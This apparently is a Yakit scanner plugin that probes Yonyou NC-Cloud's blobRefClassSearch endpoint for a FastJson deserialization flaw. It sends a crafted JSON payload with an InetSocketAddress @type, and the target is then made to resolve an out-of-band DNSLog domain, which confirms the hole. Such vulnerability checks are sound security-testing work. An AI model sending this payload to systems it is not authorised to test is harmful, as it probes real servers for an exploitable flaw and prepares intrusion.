# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `POST /ncchr/pm/ref/indiIssued/blobRefClassSearch HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.1
Content-Type: application/json
Content-Length: 120

{"clientParam":"{\"x\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"{{params(reverseURL)}}\"}}}"}`

	r0_flag = false 
	server,token,err = risk.NewDNSLogDomain()
	die(err)
	yakit.Info("dnslog server addr: %v ",server)
	yakit.Info("dnslog server check token: %v", token)

    rsp,req,_ = poc.HTTP(packet1, 
    poc.params({"target":addr,"reverseURL":server}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
	time.sleep(40)

	detail, _ := risk.CheckDNSLogByToken(token)

	if len(detail) > 0{
        r0_flag = true
    }

    if r0_flag{
        yakit.Info("%v found 用友NC-Cloud blobRefClassSearch接口FastJson反序列化漏洞", addr)
        risk.NewRisk(
        addr,
        risk.title("用友NC-Cloud blobRefClassSearch接口FastJson反序列化漏洞"),
        risk.severity("high"),
        risk.titleVerbose("用友NC-Cloud blobRefClassSearch接口FastJson反序列化漏洞"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
    )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }

}
